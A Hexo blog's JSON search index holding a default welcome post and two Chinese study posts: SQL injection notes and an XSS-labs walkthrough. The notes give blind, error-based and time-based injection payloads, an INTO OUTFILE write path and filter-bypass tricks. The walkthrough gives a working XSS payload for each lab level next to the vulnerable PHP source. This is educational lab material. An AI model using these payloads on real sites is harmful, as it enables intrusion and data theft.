[{"title":"Hello World","url":"/2022/10/15/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"SQL注入学习笔记","url":"/2020/04/07/sql%E6%B3%A8%E5%85%A5/","content":"基础知识（1）注入的分类基于从服务器接收到的响应▲基于错误的 SQL 注入▲联合查询的类型▲堆查询注射▲SQL 盲注•基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注基于如何处理输入的 SQL 查询（数据类型）▲基于字符串▲数字或整数为基础的基于注入点的位置上的▲通过用户输入的表单域的注射。▲通过 cookie 注射。▲通过服务器变量注射。 （基于头部信息的注射）（2）系统函数\nversion()——MySQL 版本\nuser()——数据库用户名\ndatabase()——数据库名 \n@@datadir——数据库路径\n@@version_compile_os——操作系统版本\n\n（3）字符串连接函数\nconcat(str1,str2,…)——没有分隔符地连接字符串\nconcat_ws(separator,str1,str2,…)——含有分隔符地连接字符串\ngroup_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据\n\n（4）一般流程猜数据库select schema_name from information_schema.schemata猜某库的数据表select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’猜某表的所有列select column_name from information_schema.columns where table_name&#x3D;’xxxxx’获取某列的内容select *** from ****PS：一般都会用到group_concat来显示所有数据。\n（5）盲注基于布尔 SQL 盲注———-构造逻辑判断▲left(database(),1)&gt;’s’ &#x2F;&#x2F;left()函数Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前b 位\n▲ascii(substr((select table_name information_schema.tables where tables_schema&#x3D;database()limit 0,1),1,1))&#x3D;101 –+ &#x2F;&#x2F;substr()函数，ascii()函数Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换为 ascii 值 \n▲ascii(substr((select database()),1,1))&#x3D;98▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 &#x2F;&#x2F;ORD()函数，MID()函数Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 Ord()函数同 ascii()，将字符转为 ascii 值\n▲regexp 正则注入 select user() regexp ‘^[a-z]’;Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。\n▲like 匹配注入select user() like ‘ro%’\n基于报错的 SQL 盲注——构造 payload 让信息通过错误提示回显出来▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; &#x2F;&#x2F;mysql 重复特性，此处重复了 version，所以报错。基于时间的 SQL 盲注———-延时注入▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if 判断语句，条件为假，执行 sleep（6）导入导出相关操作导入到文件SELECT…..INTO OUTFILE ‘file_name’\nSelect  …… into outfile “c:\\phpnow\\htdocs\\test.php”\n（7）增删改函数插入insert into users values(‘16’,’lcamry’,’lcamry’);\n删除删数据: delete from \n表名; delete from 表名 where id&#x3D;1; \n 删除结构： \n删数据库：drop database 数据库名; \n删除表：drop table 表名; \n删除表中的列:alter table 表名 drop column 列名;\nps:delete from users where id&#x3D;16\n修改&#x2F;更新修改所有：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ ; \n带条件的修改：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ where id&#x3D;6;\nps: update users set username&#x3D;’tt’ where id&#x3D;15\n（8）HTTP 头部如何绕过 or 和 and 过滤。一般性提供以下几种思路：\n（1）大小写变形 Or,OR,oR \n（2）编码，hex，urlencode \n（3）添加注释&#x2F;or&#x2F; \n（4）利用符号 and&#x3D;&amp;&amp; or&#x3D;||\n对于注释和结尾字符的我们此处只能利用构造一个 ’ 来闭合后面到 ’ ；\n对于空格，有较多的方法：\n %09 TAB 键（水平）\n %0a 新建一行\n %0c 新的一页\n %0d return 功能 \n%0b TAB 键（垂直）\n %a0 空格\n","categories":["笔记"],"tags":["SQL注入"]},{"title":"XSS-labs通关笔记","url":"/2020/04/07/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/","content":"XSS-labs通关笔记level 1\n我们可以看到这里将name的参数值，插入到了 中，这里就是反射型xss，直接给name重新赋值。\n\n服务器并没有进行任何的过滤，我们可以看看服务器端\n服务器端源代码&lt;/script&gt;\n&lt;title&gt;欢迎来到level1&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;\n&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;name&quot;];                                                         &#x2F;&#x2F;这里将name赋值给了str\necho &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;       &#x2F;&#x2F;这里直接将str插入了标签之间,导致反射型xss形成\n**?&gt;**\n&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\nlevel 2\n可以发现，通过get传参提交，经过服务器的动态处理之后又会将参数keyword的值插入到&lt;h2&gt; &lt;/h2&gt;标签之中以及\n添加到&lt;input&gt;标签中的value属性的值内。\n我们尝试用上关的payload提交\n\n可以看到，在&lt;h2&gt; &lt;/h2&gt;标签之中的恶意代码被编码了，其中&lt;和&gt;都被编码成了html字符实体，猜测在服务器端用htmlspecialchars()函数对keyword参数的值进行了处理，接着往下看可以看到插入到value参数值中的恶意代码并没有被编码而是直接原样返回，但是问题是这里的js代码在标签属性值中，浏览器是无法执行的，既然上面的恶意代码被编码了，那么只能从属性值中的恶意代码处进行突破了。\n要想浏览器执行这里的弹窗代码，只需要将属性的引号和标签先闭合就可以了\n用”&gt;闭合前面的&lt;input，再用&#x2F;&#x2F;将后面的”注释掉。\npayload：n3ym4r&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;//\n服务器端源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];&#x2F;&#x2F;将get方式传递到服务器端的keyword参数的值赋给str变量\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n &#x2F;&#x2F;用htmlspecialchars()函数对变量str进行处理之后显示到网页上\n&lt;form action=level2.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;&#x2F;&#x2F;直接将变量值插入到了&lt;input&gt;标签的value属性值中\n&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;\n?&gt;\nlevel 3简单测试，发现与第二关相比，这里将属性值这里也进行了htmlspecialchars()函数处理。\n\n这里，无法使用标签，因为标签都是带有&lt;&gt;符号的，就会被转义。但该函数不会转义单引号，可以采用事件闭合标签。\npayload &#39; onclick=&#39;alert(1)&#x2F;&#x2F;当单击鼠标时运行脚本\n&#39; onmouseover=&#39;alert(1)&#x2F;&#x2F;当鼠标指针移至元素之上时运行脚本\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;\n&lt;form action=level3.php method=GET&gt;\n&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;   \n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&quot;;\n?&gt;\nhtmlspecialchars ()将特殊字符转换为html实体\nlevel 4\n可以看到&lt;&gt;符号被替换成了空\n但是事件不需要用到&lt;&gt;，所以直接用鼠标事件插入\npayload&quot; onmouseover=&quot;alert(/xss/)\n我们还是同样需要闭合他原来的语句。\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); \n$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);&#x2F;&#x2F;将&lt;&gt;替换为空\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level4.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nlevel 5源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level5.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n可以看到将&lt;script替换为了&lt;scr_ipt,同时也将on替换为了o_n,这使得我们无法通过&lt;script&gt;标签或触发事件来执行js代码，那么我们可以换个标签，使用a标签的js伪协议实现href属性支持javascript:伪协议构造poc 产生一个链接\npayload&quot;&gt; &lt;a href=javascript:alert(&#39;xss&#39;) &gt; xss&lt;/a&gt; //\nlevel 6源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);&#x2F;&#x2F;限制&lt;script恶意代码\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);&#x2F;&#x2F;限制带on的事件\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);&#x2F;&#x2F;限制图片标签，&lt;img src&#x3D;111 onerror&#x3D;alert(‘xss’)&gt;\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);&#x2F;&#x2F;data:对字符编码的一种设定\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);&#x2F;&#x2F;限制通过在href属性中插入js代码来点击执行\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level6.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n可以看到做了很多限制，但是都是判断的整个字符，我们可以大小写绕过\npayload&quot;&gt;&lt;sCrIpt&gt;alert(/xss/)&lt;/ScRipt&gt;\nlevel 7源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str =strtolower( $_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);&#x2F;&#x2F;将script替换为空，以下同理\n$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);\n$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);\n$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);\n$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level7.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n因为只会对整个字符串进行一次替换，所以我们可以使用双写绕过\npayload&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;\nlevel 8源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);\n$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);\necho &#39;&lt;center&gt;\n&lt;form action=level8.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;\n&lt;input type=submit name=submit value=添加友情链接 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n&lt;?php\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;; &#x2F;&#x2F;在这里进行拼接\n?&gt;\n&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;\n?&gt;\n可以看到将大部分能用到的字符都做了破坏，看到友情链接那里，我们可以使用编码的方式绕过\n\npayload&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;\nlevel 9源代码&lt;?php \n\nini_set(&quot;display_errors&quot;, 0);\n\n$str = strtolower($_GET[&quot;keyword&quot;]);\n\n$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);\n\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\n\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);\n\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);\n\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);\n\n$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);\n\necho &#39;&lt;center&gt;\n\n&lt;form action=level9.php method=GET&gt;\n\n&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;\n\n&lt;input type=submit name=submit value=添加友情链接 /&gt;\n\n&lt;/form&gt;\n\n&lt;/center&gt;&#39;;\n\n?&gt;\n\n&lt;?php\n\nif(false===strpos($str7,&#39;http://&#39;))  \n\n&#123;\n\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;\n\n   &#125;\n\nelse\n\n&#123;\n\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;\n\n&#125;\n\n?&gt;\n\n&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;\n\n&lt;?php \n\necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;\n\n?&gt;\n\nif(false&#x3D;&#x3D;&#x3D;strpos($str7,’http:&#x2F;&#x2F;‘))  判断是否包含http:&#x2F;&#x2F;然后返回,这里还是可以通过编码来绕过\npayload&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://\nlevel 10\n可以看到有三个input标签，我们得测试出哪个表单可以突破\n构造语句：?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;\n\nt_sort时，出现一个输入框，所以我们可以确定了\npayload?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\n源代码我们可以再看看源代码\n&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str11 = $_GET[&quot;t_sort&quot;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n可以看到，我们的猜测没错,值得注意的是，这里会将&lt;&gt;替换为空，不能通过闭合input，引入新的标签来触发，只能通过事件来触发。\nlevel 11源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_SERVER[&#39;HTTP_REFERER&#39;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n这一关卡和上面的一关非常的像多了一个input表单的信息，在服务器端还将请求头中的referer头的值赋给了str11这个变量，$_SERVER[‘HTTP_REFERER’]  #链接到当前页面的前一页面的 URL 地址，也就是说这里可以做点文章。在将变量值中的&lt;和&gt;删除之后就会插入到t_ref这个标签的value属性值中。而上一关的t_sort标签虽然也能接收并显示参数值，但是这个参数值是要用htmlspecialchars()函数处理的。\n这里，我们就可以抓包，将数据包中的referer改为我们的恶意代码\n\npayloadreferer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\nlevel 12\n查看网页源码，我们发现，有一个和ua头一样的参数值，我们可以大胆猜测，这关测试点就在ua头，抓包改包试试\n\n成功\npayloadUser-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n将keyword参数的值赋给了变量str\n将t_sot参数的值赋给了变量str00，\n将请求中User-Agent头的值赋给了变量str11,。\n将变量str11的值中存在的&lt;和&gt;删除之后直接插入到了t_ua标签的value\n属性值中。\n在这里变量str和str00的值都是需要被htmlspecialchars()函数处理过\nlevel 1313关猜测还是与数据头有关\n\n\n可以看到，是将cookies里的值放入了t_cook中，修改为恶意代码\npayloadCookie: user=1&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;\n源代码&lt;?php \nsetcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);\nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_COOKIE[&quot;user&quot;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nlevel 14修改iframe调用的文件来实现xss注入(但因为iframe调用的文件地址失效，无法进行测试\nlevel 15\n可以看到我们提交的src参数被插入到了&lt;span&gt;标签的class属性值中，但是前面还有ng-include这样的字符。\nng-include是angular js中的东西，其作用相当于php的include函数。这里就是将1.gif这个文件给包含进来。\nng-include相关知识点1、ng-include 指令用于包含外部的 HTML文件。\n2、包含的内容将作为指定元素的子节点。\n3、ng-include 属性的值可以是一个表达式，返回一个文件名。\n4、默认情况下，包含的文件需要包含在同一个域名下。\n特别值得注意的几点如下：\n1.ng-include,如果单纯指定地址，必须要加引号\n2.ng-include,加载外部html，script标签中的内容不执行\n3.ng-include,加载外部html中含有style标签样式可以识别\n构造函数?src&#x3D;’level1.php?name&#x3D;‘因为这里参数值算是一个地址，所以需要添加引号。\n但是level1.php不是一个php文件吗？\n这里解释一下，这是因为我们不是单纯的去包含level1.php，而是在后面添加了name参数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的html文件给包含进来的意思。\npayload?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;src&quot;];\necho &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;\n?&gt;\nlevel 16\n可以看到，我们输入的值被插到了标签中，我们尝试直接弹窗，发现很多字符被编码，来看看源代码\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);\n$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);\n$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);\n$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);\necho &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;\n?&gt;\n&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;\n?&gt;\n可以看到，将参数值中的script替换成&amp;nbsp;，将参数值中的空格也替换成&amp;nbsp;，将参数值中的&#x2F;符号替换成&amp;nbsp;\n与我们的猜想一致\n绕过思路：可以用回车来将它们分开。\n而且这里&#x2F;符号也被编码了，所以我们需要的是一个不需要闭合的标签，比\n如之前所用过的\n\n\n回车可以用url编码%0a表示\npayload&lt;img%0Asrc=1%0Aonerror=alert(1)&gt;\nlevel 17\n可以看到提交的参数插入到了标签的src属性中，尝试直接弹窗，发现转义了很多符号。\n尝试构造事件弹窗，可以看到这里的src没有用引号闭合，我们就不用管\npayloadonclick=alert(&#39;xss&#39;)\nonmousedown=&#39;alert(1)&#39;\n\n\n源代码&lt;?php·\nini_set(&quot;display_errors&quot;, 0);\necho &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;\n?&gt;\n可以看到和我们的猜测一致\nlevel 18与17关一致\nlevel 19与之前一致，不过用了引号将src闭合，所以不能直接在后面添加语句，我们可以通过F12控制台添加\n","categories":["笔记"],"tags":["笔记"]}]